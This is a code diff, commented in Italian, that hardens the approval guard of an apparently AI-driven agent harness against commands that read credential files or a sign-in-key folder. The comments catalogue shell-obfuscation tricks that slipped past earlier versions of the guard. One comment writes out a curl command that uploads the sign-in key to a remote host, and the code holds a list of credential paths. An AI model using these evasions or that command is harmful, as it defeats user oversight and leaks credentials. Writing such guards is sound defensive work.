  * Dove porta DAVVERO un percorso locale, a parole: `lstat` + `readlink`, un pezzo alla volta, mai la destinazione aperta.
- * Un pezzo che non esiste chiude il cammino (il resto si tiene com'è scritto). `null` = un salto porta in rete, o troppi salti.
+ * Un pezzo che non esiste chiude il cammino (il resto si tiene com'è scritto). `null` = un salto porta in rete.
+ * ⛔ S3 (revisione di Performance su 1f5c8695a): oltre i 40 salti il cammino non sa dove arriva, e Windows segue le giunzioni fino a 63.
+ *   Prima si dava `null`, che chi legge prende per «niente da dire»: ora `OLTRE_IL_TETTO`, e chi legge chiede «troppo complesso».
  */
+const OLTRE_IL_TETTO = Symbol('oltre-il-tetto-dei-salti');
 function percorsoVeroAParole(assoluto, { lstatSync: lstatFn, readlinkSync: readlinkFn }) {
   let davanti = assoluto;
   for (let salti = 0; salti <= 40; salti += 1) {
@@ -1174,8 +1395,10 @@ function percorsoVeroAParole(assoluto, { lstatSync: lstatFn, readlinkSync: readl
     }
     if (!deviato) return davanti;
   }
-  return null;
+  return OLTRE_IL_TETTO;
 }
+/** La segnalazione di un cammino oltre il tetto: si chiede col perché dei tetti, sul percorso com'è scritto. */
+const oltreIlTetto = (scritto) => ({ classe: 'segreto', percorso: scritto, perche: 'troppo-complesso' });
 
 function bersaglioSegretoDiUnCollegamento(percorso, { cartella, home, fsSync = { lstatSync: lstatSyncNativa, readlinkSync: readlinkSyncNativa } }) {
   const grezzo = String(percorso ?? '').trim();
@@ -1191,10 +1414,12 @@ function bersaglioSegretoDiUnCollegamento(percorso, { cartella, home, fsSync = {
     const assoluto = assolutoScritto ? risolvi(normalizzato) : risolvi(cartella, normalizzato);
     const reale = percorsoVeroAParole(assoluto, fsSync);
     if (reale === null) return null;
+    if (reale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
     const stesso = process.platform === 'win32' ? reale.toLowerCase() === assoluto.toLowerCase() : reale === assoluto;
     if (stesso) return null;
     const radiceReale = conCartella ? percorsoVeroAParole(risolvi(cartella), fsSync) : null;
     if (conCartella && radiceReale === null) return null;
+    if (radiceReale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
     const dentro = radiceReale !== null && isPathInside(radiceReale, reale);
     const daClassificare = dentro ? relativoA(radiceReale, reale) : reale;
     if (daClassificare === '') return null;
@@ -1240,11 +1465,13 @@ function segretoDiUnCollegamentoFisico(percorso, { cartella, home, statFn = stat
     if (!veri.has(cartellaScritta)) veri.set(cartellaScritta, percorsoVeroAParole(cartellaScritta, fs));
     const cartellaVera = veri.get(cartellaScritta);
     if (cartellaVera === null) return null;
+    if (cartellaVera === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
     let reale = join(cartellaVera, nomeBase(assoluto));
     const foglia = fs.lstatSync(reale);
     if (foglia.isSymbolicLink()) {
       reale = percorsoVeroAParole(reale, fs);
       if (reale === null) return null;
+      if (reale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
     }
     const info = statFn(reale, { bigint: true });
     /* R3 (revisione): `ino` 0 su certe unità (rete, FUSE, WebDAV) farebbe di ogni file con due nomi «il .env»; R4: un file vuoto non ha
@@ -1333,6 +1560,11 @@ const CHIAVI_DELLA_FRASE = Object.freeze({
   // 14/10/2026: un file d'esempio che dentro ha una chiave vera (`esempioConUnaChiave`): segreto come gli altri, la frase dice perché
   'esempio-con-chiave|leggi': 'server.approval.read.exampleWithKey',
   'esempio-con-chiave|shell': 'server.approval.command.exampleWithKey',
+  /* blocco dopo (punti 2 e 3, 04/11/2026): il PERCHÉ della carta vince sulla classe, quando c'è. Il comando dei biglietti diceva «un file che può contenere chiavi
+     (biglietto-talos)», un nome tecnico a schermo; un tetto della guardia diceva lo stesso. Ora la carta dice che cosa il comando può fare, o che non si è potuto
+     controllare. Il `percorso` resta quello di prima; la chiave del consenso porta anche il perché, decisione 107, `chiaveDelConsensoDi` (fonti: `FONTI-GUARDIA-BLOCCO-DOPO-2026-11-04.md`, B1-B5). */
+  'biglietti|shell': 'server.approval.command.signInLink',
+  'troppo-complesso|shell': 'server.approval.command.tooComplex',
 });
 const FRASI_INGLESI = Object.freeze({
   'server.approval.read.keychain': "This read opens the system keychain, where passwords are kept: do you want me to do it?",
@@ -1350,12 +1582,15 @@ const FRASI_INGLESI = Object.freeze({
   'server.approval.read.hiddenOutside': "This read opens a hidden folder outside the working folder ({percorso}): do you want me to do it?",
   'server.approval.list.hiddenOutside': "This listing opens a hidden folder outside the working folder ({percorso}): do you want me to do it?",
   'server.approval.command.hiddenOutside': "The command touches a hidden folder outside the working folder ({percorso}): do you want me to run it?",
+  'server.approval.command.signInLink': "The command can create a sign-in link to this app, or read the key that makes those links, and whoever holds one gets in as you: do you want me to run it?",
+  'server.approval.command.tooComplex': "The command is too complex for me to check what it reads: do you want me to run it?",
 });
 
 /** La copia per la persona: lingua naturale, nessun nome tecnico, e DICE quale file. Inglese + chiave + valori (K4b). */
 function frasePerLaPersona(segnalazione, tipo) {
   const tipoDellaFrase = tipo === 'leggi' || tipo === 'elenca' ? tipo : SCRITTURE.has(tipo) ? 'scrivi' : 'shell';
-  const fraseChiave = CHIAVI_DELLA_FRASE[`${segnalazione.contenuto === true ? 'esempio-con-chiave' : segnalazione.classe}|${tipoDellaFrase}`];
+  const perIlPerche = segnalazione.perche ? CHIAVI_DELLA_FRASE[`${segnalazione.perche}|${tipoDellaFrase}`] : undefined;
+  const fraseChiave = perIlPerche ?? CHIAVI_DELLA_FRASE[`${segnalazione.contenuto === true ? 'esempio-con-chiave' : segnalazione.classe}|${tipoDellaFrase}`];
   if (fraseChiave) {
     const fraseParams = { percorso: segnalazione.percorso };
     /* ⛔ sostituzione con FUNZIONE: un percorso con `$&` o `$1` non deve diventare un'altra frase (lezione del 02/09) */
@@ -1399,12 +1634,38 @@ function fraseDiRiserva(segnalazione, tipo) {
  */
 /*
  * ⛔ Owner 16/10/2026 notte («No, separati»): il sì «Consenti questo percorso per la sessione» dato per LEGGERE un segreto non vale
- *   per SCRIVERLO — come Claude Code, dove `Read(.env)` ed `Edit(.env)` sono regole diverse. Il registro salva la `chiaveDelConsenso`
- *   quando c'è (la scrittura ha la sua, `scrittura:<percorso>`), il kernel la cerca allo stesso modo; una lettura resta senza chiave
- *   e usa il percorso com'era, così i consensi già dati non cambiano significato.
+ *   per SCRIVERLO — come Claude Code, dove `Read(.env)` ed `Edit(.env)` sono regole diverse.
+ * ⛔ Decisione 107 dell'owner (03/11/2026 sera, «Un sì per ogni motivo»): il sì vale anche per il MOTIVO della carta, come Hermes
+ *   (`tools/approval.py:263-266`: sessione + schema; `:381-387`: chi salva e chi rilegge usano la stessa chiave). Fino a 1f5c8695a la carta
+ *   dei biglietti veri e quella «troppo complesso» salvavano la stessa chiave (`biglietto-talos`): un sì dato a un comando illeggibile
+ *   lasciava passare i biglietti veri. Fonti: `FONTI-GUARDIA-CONSENSO-PER-MOTIVO-2026-11-04.md`.
+ * ⇒ UNA funzione compone la chiave, e la usano tutti: il registro che salva il sì (dalla domanda in attesa, mai dal client), il kernel e
+ *   la prova dell'obiettivo che la cercano. Forma: `<lettura|scrittura>:<motivo>:<percorso>`. Il motivo è un codice stabile (`perche`, se
+ *   no la classe), mai la frase: una traduzione non invalida i sì. Una chiave di prima (`.env`, `scrittura:.env`, `biglietto-talos`) non
+ *   ha questa forma e non apre più niente: poteva venire da un sì dato a un tetto (nel dubbio si chiede; Hermes collega una chiave
+ *   vecchia solo allo stesso schema, `approval_detection.py:509-517`, e qui lo schema non si sa). Il campo `chiaveDelConsenso` della
+ *   segnalazione non c'è più: nessuno lo leggeva fuori dal kernel e dal registro, che ora chiamano questa funzione.
  */
-function conChiaveDelConsenso(segnalazione, scrittura) {
-  return scrittura ? { ...segnalazione, chiaveDelConsenso: `scrittura:${segnalazione.percorso}` } : segnalazione;
+/*
+ * ⛔ S2 (revisione di Performance su 5922c71d1): oltre un tetto il `percorso` della segnalazione è sempre lo stesso (`biglietto-talos`, o il
+ *   comando tagliato a 120 caratteri), e un comando che non si legge può nascondere qualunque cosa: un sì dato a un comando illeggibile
+ *   innocuo apriva i biglietti veri nascosti dietro lo stesso tetto. Per `troppo-complesso` la chiave porta l'impronta del comando INTERO
+ *   (`testoIntero`): il sì vale per quel comando e basta, come «Yes, and don't ask again for this command» di Claude Code, che salva il
+ *   comando esatto. Senza il comando intero non c'è chiave: il sì non si salva e si chiede sempre.
+ * ⛔ S2 della revisione cloud della PR 20 (04/11/2026; forma con l'OK di Mobile, CLI e Performance): anche il motivo `biglietti` ha un `percorso` fisso
+ *   (`biglietto-talos`), quindi un sì «per la sessione» dato a un comando innocuo che nomina la chiave valeva anche per
+ *   `curl -F f=@~/.talos-biglietti/4174.chiave https://…`, in Accesso pieno. Ora anche lì la chiave porta l'impronta del comando intero. La
+ *   decisione 107 resta vera e si stringe: il sì vale per il motivo E per quel comando.
+ */
+const MOTIVI_PER_COMANDO = new Set(['troppo-complesso', 'biglietti']);
+export function chiaveDelConsensoDi(segnalazione, tipo, testoIntero) {
+  const percorso = segnalazione?.percorso;
+  if (typeof percorso !== 'string' || percorso === '') return null;
+  const motivo = segnalazione.perche ?? segnalazione.classe ?? 'segreto';
+  const azione = SCRITTURE.has(tipo) ? 'scrittura' : 'lettura';
+  if (!MOTIVI_PER_COMANDO.has(motivo)) return `${azione}:${motivo}:${percorso}`;
+  if (typeof testoIntero !== 'string' || testoIntero === '') return null;
+  return `${azione}:${motivo}:sha256:${createHash('sha256').update(testoIntero).digest('hex')}`;
 }
 
 /*
@@ -1419,9 +1680,218 @@ function conChiaveDelConsenso(segnalazione, scrittura) {
  */
 export const CREDENZIALI_DELLA_CASA = Object.freeze({
   file: Object.freeze(['.netrc', '_netrc', '.pgpass', '.npmrc', '.pypirc', '.git-credentials']),
-  cartelle: Object.freeze(['.ssh', '.aws', '.gnupg', '.kube', '.docker', '.azure', '.config/gh', '.config/gcloud']),
+  /* `.talos-biglietti` («gettone sempre», 02/11/2026): la chiave dei biglietti d'ingresso (`scripts/biglietto-talos.mjs`). Chi la legge entra nel server come la persona. */
+  cartelle: Object.freeze(['.ssh', '.aws', '.gnupg', '.kube', '.docker', '.azure', '.config/gh', '.config/gcloud', '.talos-biglietti']),
   chiedono: Object.freeze(['.ssh/config']),
 });
+
+/*
+ * ⛔ «Gettone sempre» (02/11/2026, condizione del Tester e punto aperto del Desktop): il comando dei biglietti stampa un ingresso nel server, quindi vale come
+ *   leggere la sua chiave. Chiede anche in Full access. ⛔ Revisione R4: è ATTRITO sul testo, non un confine. Copre le forme normali: virgolette, `cd ~` e poi il nome
+ *   relativo, `tar`, `find`, gli asterischi (N7 della seconda revisione: anche quelli corti, come `bi*.mjs` o una cartella `.t*`). NON copre un nome costruito pezzo per pezzo dentro un
+ *   programma (`node -e "…'/.talos-'+'biglietti'…"`), né chi copia il comando sotto un altro nome: ricadono fra i programmi dello stesso utente coi pieni poteri (`src/gettone.mjs`).
+ */
+const COMANDO_DEI_BIGLIETTI = /(?:^|[^a-z0-9])biglietto-talos(?:\.mjs)?(?:$|[^a-z0-9])/iu;
+/*
+ * ⛔ S5 della revisione cloud della PR 20 (04/11/2026): `\.chiave` dopo un nome qualunque prendeva anche le parole del codice (`fuoriDalProgetto.chiave`, 57 volte in 27
+ *   file nostri), e un `grep` comune chiedeva la carta anche in Accesso pieno. La chiave dei biglietti ha UN nome: `<porta>.chiave` (`scripts/biglietto-talos.mjs:22-24`).
+ *   Si riconosce allora la cartella, oppure un nome di file la cui radice può essere una porta: dopo l'ultimo separatore (`/`, `\`, `=`, `@`, `:`, `,`, `;`) niente
+ *   lettere fuori dalle classi, cioè cifre, jolly, `?`, `*` o classi (`4174.chiave`, `*.chiave`, `$P.chiave`, `f=@4174.chiave`). Come Hermes, che riconosce un percorso
+ *   sensibile dal NOME del file e non da una parola nel testo (`agent/file_safety.py:176-219`).
+ */
+const CHIAVE_DEI_BIGLIETTI = /\.talos-biglietti/iu;
+const NOME_DELLA_CHIAVE = /(?:^|[/\\=@:,;])([^/\\=@:,;]*)\.chiave(?=$|[^a-z0-9])/giu;
+/** La radice di un nome `<radice>.chiave` può essere una porta? Niente lettere fuori dalle classi `[..]`, e almeno un carattere. */
+function radiceDaPorta(radice) {
+  const fuoriDalleClassi = radice.replace(/\[[^\]]*\]/gu, '0');
+  return fuoriDalleClassi !== '' && !/[a-z]/iu.test(fuoriDalleClassi);
+}
+function nominaLaChiave(parola) {
+  for (const m of parola.matchAll(NOME_DELLA_CHIAVE)) if (radiceDaPorta(m[1])) return true;
+  return false;
+}
+const NOMI_DEL_COMANDO = Object.freeze(['biglietto-talos.mjs', 'biglietto-talos']);
+
+/*
+ * ⛔ N11 della quarta revisione (03/11/2026 sera): la guardia era una lista di nomi, e la shell riscrive il testo DOPO che la guardia l'ha letto (la classe GuardFall,
+ *   Adversa/CSA 30/06/2026; «One Goal, Many Commands», arXiv 2606.15549). `[a-c]iglietto`, `[!x]`, `[[:alpha:]]`, `{b..b}`, `b$'\x69'glietto`, `b${X:-i}glietto` passavano.
+ *   La cura non allunga la lista: si legge il comando come lo legge la shell, parola per parola, con lo stesso lettore del controllo dei segreti (`paroleDellaShell`:
+ *   apici e barre tolti, `$'..'` decodificato, ogni sostituzione che il testo non dice diventa il jolly), le graffe espanse (`espandiGraffe`), una sequenza `{a..b}`
+ *   scritta per esteso come fa bash, o il jolly se non si può (`formeDellaParola`, dai buchi della guardia), le classi `[..]` come classi (`combaciatoreDelSegmento`). Poi ogni parola si confronta coi nomi COME UN GLOB: se può voler dire il comando, la
+ *   cartella o la chiave, si chiede. Nel dubbio si chiede, anche se il lettore lancia. È il principio di Claude Code (2.1.317: un nodo che non si può verificare prima
+ *   è «too-complex» e chiede), di Codex (`shell-command/src/bash.rs:260-273`, `is_literal_word_or_number`: una parola con `{}*?[]\~^#$` o apici inversi non è una prova del nome vero) e di OpenCode («opaque»).
+ * ⛔ Il tetto delle interruzioni: perché una parola chieda servono lettere scritte che portino al nome. Il comando: almeno una lettera sua prima di `.mjs` (o due classi);
+ *   la chiave: almeno tre lettere o classi nell'estensione (`*.c*` resta libero); la cartella: un nome nascosto come prima (N7), oppure quattro lettere o classi. Misurato
+ *   su dieci comandi tipici: zero carte prima, zero dopo (`CURE-N11-G1-2026-11-03.md`).
+ * ⛔ RESTA FUORI, detto: una parola fatta SOLO di sostituzioni (`node "$S"`, `node $(cat nome)`): il testo non dice niente e chiedere lì vorrebbe dire chiedere a ogni
+ *   `node "$FILE"`. Restano fuori anche `eval`, un nome costruito dentro un programma (`node -e "…'/.talos-'+'biglietti'…"`) e un comando copiato sotto un altro nome.
+ *   Una variabile assegnata prima e usata DENTRO una parola con lettere sue (`f=igliett; node b${f}o-talos.mjs`) invece chiede: il jolly copre qualunque valore.
+ *   È attrito sul testo, non un confine: il confine è altrove (`src/gettone.mjs`).
+ */
+/*
+ * ⛔ Buchi della guardia (revisione di Performance, 03/11/2026 notte; `BUCHI-GUARDIA-2026-11-04.md`, fonti `FONTI-BUCHI-GUARDIA-2026-11-04.md`):
+ *   - F1 (S2): `bash -c "node bigl''ietto-talos.mjs"`. Nella lettura appiattita gli apici SEPARAVANO le parole (`bigl` + `ietto-talos.mjs`), mentre la shell che
+ *     rilegge il testo li toglie e le unisce. Due cure: (a) il codice annidato si rilegge DAVVERO come un comando, con le stesse letture, come fa già il controllo dei
+ *     segreti e come fanno Hermes (`tools/approval_detection.py:993-1020`, il carico di `-c` diventa una variante a sé) e Continue (`evaluateTerminalCommandSecurity.ts:
+ *     245-256`, le sostituzioni si valutano di nuovo): `$(..)`, apici inversi, `bash -c`, `powershell -c`, `cmd /c`, `iex`; (b) una quarta lettura con gli apici TOLTI,
+ *     non sostituiti, come la normalizzazione di Hermes (`approval_detection.py:536-538`, `r''m → rm`): copre chi rilegge un testo senza che lo riconosciamo come
+ *     interprete (`ssh casa '…'`, `su -c '…'`, `watch '…'`).
+ *   - F2 (S2): le variabili di cmd valgono il jolly nella lettura di cmd e PowerShell (`variabiliDiCmd`, vedi `VARIABILE_DI_CMD`).
+ *   - S3: le sequenze `{x..y}` si scrivono per esteso (`formeDellaParola`), la stessa funzione del controllo dei segreti.
+ *   Oltre quattro livelli di codice annidato, oltre `LETTURE_ANNIDATE.testi` testi o `LETTURE_ANNIDATE.caratteri` caratteri riletti, si chiede (il lettore lancia, e il
+ *   cancello nel dubbio chiede).
+ * ⛔ RESTA FUORI, detto (F3, S3): un nome COSTRUITO da un'espressione, come la concatenazione di PowerShell `node ("bigl"+"ietto-talos.mjs")`,
+ *   `powershell -c "node ('bigl'+'ietto-talos.mjs')"` o `$n='bigl'+'ietto-talos.mjs'; node $n`. È il limite 2 qui sopra (un nome costruito dentro un programma): per
+ *   leggerlo bisogna valutare l'espressione (Microsoft Learn, about_Arithmetic_Operators: `+` concatena le stringhe), cosa che fa un interprete, non un lettore di
+ *   parole. Codex rifiuta per intero un comando PowerShell con un'espressione (`powershell_parser.ps1:118-150`: solo costanti, il resto è «unsupported»). È attrito,
+ *   non un confine: il confine resta `src/gettone.mjs`.
+ */
+const LETTURE_ANNIDATE = Object.freeze({ profondita: 4, testi: 32, caratteri: 1_000_000 });
+function paroleDaGiudicare(comando) {
+  const parole = new Set();
+  const speso = { testi: 0, caratteri: 0 };
+  const leggi = (testo, profondita) => {
+    /* Quattro letture. La barra rovescia come la toglie sh (`bigliett\o`) e come separatore di cmd e PowerShell (`$HOME\.talos-bigliett[h-j]\x`), dove valgono anche le
+       variabili di cmd. La terza è «appiattita»: `$(`, apici e apici inversi separano le parole (le parentesi le separa già il lettore). La quarta toglie gli apici senza
+       separare (F1). */
+    const appiattito = testo.replace(/\$\(|[`'"]/gu, ' ');
+    const senzaApici = testo.replace(/\$\(|`/gu, ' ').replace(/['"]/gu, '');
+    /* una lettura uguale a una già fatta non dice niente di nuovo: la seconda cambia qualcosa solo con una `\` o una variabile di cmd, le altre solo con apici o `$(` */
+    const letture = [[testo, false]];
+    if (testo.includes('\\') || haVariabiliDiCmd(testo)) letture.push([testo, true]);
+    if (appiattito !== testo) letture.push([appiattito, false]);
+    if (senzaApici !== testo && senzaApici !== appiattito) letture.push([senzaApici, false]);
+    const viste = new Set();
+    for (const [testoDelComando, windows] of letture) {
+      for (const { testo: scritta } of paroleDellaShell(testoDelComando, { barraDiWindows: windows, variabiliDiCmd: windows })) {
+        if (viste.has(scritta)) continue;
+        viste.add(scritta);
+        const { parole: forme, troppe, testo: parola } = formeDellaParola(scritta);
+        for (const forma of forme) parole.add(forma);
+        /* oltre il tetto delle forme ogni graffa rimasta vale il jolly: un insieme più largo, mai più stretto */
+        if (troppe) {
+          let largo = parola;
+          while (/\{[^{}]*\}/u.test(largo)) largo = largo.replace(/\{[^{}]*\}/gu, JOLLY);
+          parole.add(largo);
+        }
+      }
+    }
+    /* F1: il codice annidato che la shell esegue, riletto come un comando a sé.
+       ⛔ S6 della revisione cloud della PR 20 (04/11/2026): il corpo di un heredoc col delimitatore fra virgolette (`cat > f <<'EOF'`) è testo, la shell non
+       ci esegue né `$(..)` né apici inversi (bash, «Here Documents»: «If any part of word is quoted … the lines in the here-document are not expanded»). Contarli
+       faceva scattare «troppo complesso» per un README con 33 apici inversi. Come la guardia dei segreti (`nominaUnSegretoPerGlob`), le sostituzioni si cercano
+       senza quei corpi; le PAROLE del corpo si leggono ancora qui sopra (un `node <<'EOF'` è un programma, Hermes `approval_detection.py:1010-1011`). */
+    const senzaCorpi = senzaCorpiDiHeredoc(testo);
+    const interpreti = comandiDegliInterpreti(senzaCorpi);
+    if (interpreti.troppi) throw new Error('troppi interpreti annidati');
+    for (const interno of [...sostituzioniDiComando(senzaCorpi), ...interpreti]) {
+      speso.testi += 1;
+      speso.caratteri += interno.length;
+      if (profondita >= LETTURE_ANNIDATE.profondita || speso.testi > LETTURE_ANNIDATE.testi || speso.caratteri > LETTURE_ANNIDATE.caratteri) throw new Error('codice annidato oltre il tetto');
+      leggi(interno, profondita + 1);
+    }
+  };
+  leggi(comando, 0);
+  return parole;
+}
+/** Le lettere scritte in un nome, fuori dalle classi, e le classi che stringono (`[b]`, `[a-c]`; non `[!x]`): quanto il nome dice di sé. */
+function lettereScritte(nome) {
+  let lettere = 0;
+  let classi = 0;
+  for (let i = 0; i < nome.length; i += 1) {
+    if (nome[i] === '[') {
+      const classe = traduciClasse(nome, i);
+      if (classe) { if (!classe.regex.startsWith('[^')) classi += 1; i = classe.fine; continue; }
+    }
+    if (/[a-z0-9]/iu.test(nome[i])) lettere += 1;
+  }
+  return { lettere, classi };
+}
+/*
+ * ⛔ Blocco dopo (punto 4, 04/11/2026): il NOME CORTO 8.3 di Windows. `BIGLIE~1.MJS` apre `biglietto-talos.mjs`, `TALOS-~1` la cartella `.talos-biglietti`,
+ *   `4174~1.CHI` la chiave `4174.chiave`, e nessuno dei tre somiglia al nome lungo. Si riconosce dalla FORMA, senza leggere il disco (la corrispondenza vera non si
+ *   può calcolare: dipende dall'ordine in cui i file sono nati, Microsoft Learn «Naming Files», `RtlGenerate8dot3Name`): una radice di 1-8 caratteri, `~`, un numero,
+ *   un'estensione di al più tre, otto caratteri in tutto prima del punto. Chiede se la radice è l'inizio del nome lungo pulito (`BIGLIETTO-TALOS`, `TALOS-BIGLIETTI`:
+ *   il punto iniziale cade) o la forma col riassunto (due lettere + quattro cifre esadecimali), e l'estensione è l'inizio di `MJS` (o manca); per la chiave basta
+ *   l'estensione `CHI` nell'ultimo nome. Restano liberi `HEAD~1`, `PROGRA~1`, `DOCUME~1`, `RUNNER~1` (misurati, GR-22). ⛔ Resta fuori, detto: il nome corto dei
+ *   SEGRETI (`.env`, `id_rsa`…) nel controllo dei segreti, che è un'altra lista e un altro giudizio; e un nome corto scritto con un jolly (`BIGL*~1.MJS`).
+ */
+const NOME_CORTO_8_3 = /^([^~.\s/]{1,8})~(\d{1,6})(?:\.([^.~\s/]{0,3}))?$/u;
+function nomeCortoDeiBiglietti(nome, ultimo) {
+  const m = NOME_CORTO_8_3.exec(nome);
+  if (!m || m[1].length + 1 + m[2].length > 8) return false;
+  const radice = m[1].toUpperCase();
+  const estensione = (m[3] ?? '').toUpperCase();
+  const daNome = (lungo) => (radice.length >= 2 && lungo.startsWith(radice)) || (radice.length === 6 && /^[0-9A-F]{4}$/u.test(radice.slice(2)) && lungo.startsWith(radice.slice(0, 2)));
+  if (daNome('BIGLIETTO-TALOS') && 'MJS'.startsWith(estensione)) return 'comando';
+  if (daNome('TALOS-BIGLIETTI') && estensione === '') return 'cartella';
+  return ultimo && estensione === 'CHI' ? 'chiave' : false;
+}
+// La cartella delle chiavi scritta con un glob (`~/.talos-b*`, `~/.t*` seguito da un nome, `.talos-bigliett[i]`): quanto basta perché non sia un nome qualunque.
+function globDellaCartellaDeiBiglietti(nomi) {
+  /* `.*` da solo come ultimo nome è «tutti i file nascosti qui» e lo nomina già il controllo dei segreti (`c005-glob-sui-nomi-segreti`, GL-3) */
+  return nomi.some((nome, i) => {
+    if (!eUnGlob(nome) || !combaciatoreDelSegmento(nome, true)('.talos-biglietti')) return false;
+    const sue = lettereScritte(nome);
+    return nome.startsWith('.') ? i < nomi.length - 1 || sue.lettere >= 1 : sue.lettere + sue.classi >= 4;
+  });
+}
+/*
+ * ⛔ Decisione 155 dell'owner (04/11/2026, aggiornamento 17:02 del brief): in Accesso pieno la guardia dei biglietti si divide. Il NOME del
+ *   comando, le parole `<porta>.chiave` e «troppo complesso» non fanno carte; la CARTELLA `~/.talos-biglietti` è una credenziale di casa
+ *   (sta in `CREDENZIALI_DELLA_CASA.cartelle`), e leggerla resta la carta della 161 in ogni sua grafia della shell: per intero, con un glob,
+ *   col nome corto 8.3 (`TALOS-~1`). Come Claude Code in `bypassPermissions`, che chiede ancora davanti a ciò che resta protetto
+ *   (code.claude.com/docs/en/permission-modes, letta il 04/11/2026), e come Hermes, che riconosce un percorso sensibile dal NOME della
+ *   cartella e non dal comando (`agent/file_safety.py:251-262`). Un lettore che lancia qui risponde «no»: il tetto non è una carta in Accesso pieno.
+ */
+function nominaLaCartellaDeiBiglietti(comando) {
+  try {
+    for (const parola of paroleDaGiudicare(String(comando ?? ''))) {
+      if (CHIAVE_DEI_BIGLIETTI.test(parola)) return true;
+      const nomi = parola.split('/').filter(Boolean);
+      if (nomi.some((nome, i) => nomeCortoDeiBiglietti(nome, i === nomi.length - 1) === 'cartella')) return true;
+      if (globDellaCartellaDeiBiglietti(nomi)) return true;
+    }
+    return false;
+  } catch {
+    return false;
+  }
+}
+/** Una parola già letta come la shell: può voler dire il comando dei biglietti, la loro cartella o una chiave? */
+function parolaDeiBiglietti(parola) {
+  if (COMANDO_DEI_BIGLIETTI.test(parola) || CHIAVE_DEI_BIGLIETTI.test(parola) || nominaLaChiave(parola)) return true;
+  const nomi = parola.split('/').filter(Boolean);
+  if (nomi.some((nome, i) => nomeCortoDeiBiglietti(nome, i === nomi.length - 1))) return true;
+  const base = nomi.at(-1) ?? '';
+  /* un nome scritto per intero l'ha già trovato la riga sopra: da qui contano i glob e i jolly */
+  const proprie = lettereScritte(base.replace(/\.m?js$/iu, ''));
+  if ((proprie.lettere >= 1 || proprie.classi >= 2) && NOMI_DEL_COMANDO.some((nome) => combaciatoreDelSegmento(base, true)(nome))) return true;
+  /* la chiave `<porta>.chiave`: la porta non si sa, si guarda l'estensione dopo l'ultimo punto scritto; S5: e una radice che può essere una porta */
+  const estensione = base.slice(base.lastIndexOf('.') + 1);
+  const sue = lettereScritte(estensione);
+  const radice = base.slice(0, base.lastIndexOf('.')).split(/[=@:,;\\]/u).at(-1);
+  if (base.includes('.') && sue.lettere + sue.classi >= 3 && radiceDaPorta(radice) && combaciatoreDelSegmento(estensione, true)('chiave')) return true;
+  /* la cartella delle chiavi */
+  return globDellaCartellaDeiBiglietti(nomi);
+}
+/** `'nomina'` (una parola può voler dire il comando, la cartella o la chiave), `'troppo-complesso'` (un tetto, o il lettore che lancia: si chiede lo stesso) o `false`. */
+function nominaIlComandoDeiBiglietti(comando) {
+  try {
+    for (const parola of paroleDaGiudicare(String(comando ?? ''))) if (parolaDeiBiglietti(parola)) return 'nomina';
+    return false;
+  } catch {
+    /* un cancello non lancia mai; nel dubbio chiede, e la carta dice perché (blocco dopo, punto 3) */
+    return 'troppo-complesso';
+  }
+}
+/** La segnalazione del comando dei biglietti: il `percorso` di sempre (è la chiave del consenso), il perché per la frase. */
+const segnalazioneDeiBiglietti = (esito) => ({ classe: 'segreto', percorso: 'biglietto-talos', perche: esito === 'troppo-complesso' ? 'troppo-complesso' : 'biglietti', [ESITO_DEI_BIGLIETTI]: esito });
+/*
+ * ⛔ S10 della revisione cloud della PR 20 (04/11/2026): in Accesso pieno il kernel chiama `motivoDaChiedere` e poi `credenzialeDellaCasaLetta` sullo stesso comando
+ *   (`talosHarness.mjs`, «credenzialeLetta»), e la guardia dei biglietti, la più cara (fino a quattro letture e 32 testi annidati), girava due volte. `motivoDaChiedere`
+ *   la fa per PRIMA e risponde subito se scatta: la sua risposta dice già l'esito. Il segno è un simbolo: non esce in JSON, non arriva alla carta né al client.
+ */
+const ESITO_DEI_BIGLIETTI = Symbol('esitoDeiBiglietti');
 
 /** La credenziale della casa che questa scrittura toccherebbe (`{ percorso }`, il percorso reale), o `null`. */
 export function scritturaDiUnaCredenziale(percorso, { cartella, home = homeDiSistema(), realpathFn = realpathSyncNativa } = {}) {
@@ -1519,7 +1989,7 @@ function progettoSottoUnaCredenziale(cartella, casa) {
  *   collegamento verso una credenziale lo trova già `motivoDaChiedere` (`→ reale` / `= candidato`): il kernel confronta anche quello.
  * @returns la segnalazione nella forma di `motivoDaChiedere`, o `null`.
  */
-export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, home = homeDiSistema(), segreto = null, fsSync, statFn = statSyncNativa, elencaFn = elencaSync } = {}) {
+export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, home = homeDiSistema(), segreto, fsSync, statFn = statSyncNativa, elencaFn = elencaSync } = {}) {
   if (typeof home !== 'string' || home === '') return null;
   const casa = risolvi(home);
   const progetto = progettoSottoUnaCredenziale(cartella, casa);
@@ -1540,7 +2010,28 @@ export function credenzialeDellaCasaLetta({ tipo, percorso, comando, cartella, h
   const fs = fsSync?.lstatSync ? fsSync : { lstatSync: lstatSyncNativa, readlinkSync: readlinkSyncNativa };
   const memoria = {};
   const veroDi = (p) => { try { return percorsoVeroAParole(p, fs); } catch { return null; } };
-  const casaVera = veroDi(casa) ?? casa;
+  /*
+   * ⛔ Blocco dopo (punto 5, 04/11/2026): un comando di 200 mila caratteri con venticinquemila parole diverse costava 5-7 secondi qui, perché ogni pezzo camminava
+   *   da capo tutte le cartelle sopra di sé (un `lstat` per cartella, per pezzo). Come in `segretoDiUnCollegamentoFisico` (R6): la CARTELLA si cammina una volta
+   *   per comando, il nome finale con un `lstat` solo, e un nome finale che è esso stesso un collegamento si cammina per intero. Stesso percorso vero: il cammino
+   *   di `percorsoVeroAParole` sulla cartella e poi sull'ultimo nome è lo stesso cammino, tagliato in due. ⛔ Una differenza sola, nel verso prudente: il tetto dei
+   *   40 salti conta la cartella e l'ultimo nome separatamente, quindi una catena di collegamenti oltre i 40 salti in tutto può arrivare a un percorso dove prima
+   *   si fermava. Oltre il tetto di un tratto si chiede «troppo complesso» (S3, `OLTRE_IL_TETTO`).
+   */
+  const cartelleVere = new Map();
+  const veroDelPezzo = (assoluto) => {
+    const sopra = cartellaDi(assoluto);
+    if (sopra === assoluto) return veroDi(assoluto);
+    if (!cartelleVere.has(sopra)) cartelleVere.set(sopra, veroDi(sopra));
+    const cartellaVera = cartelleVere.get(sopra);
+    if (cartellaVera === null || cartellaVera === OLTRE_IL_TETTO) return cartellaVera;
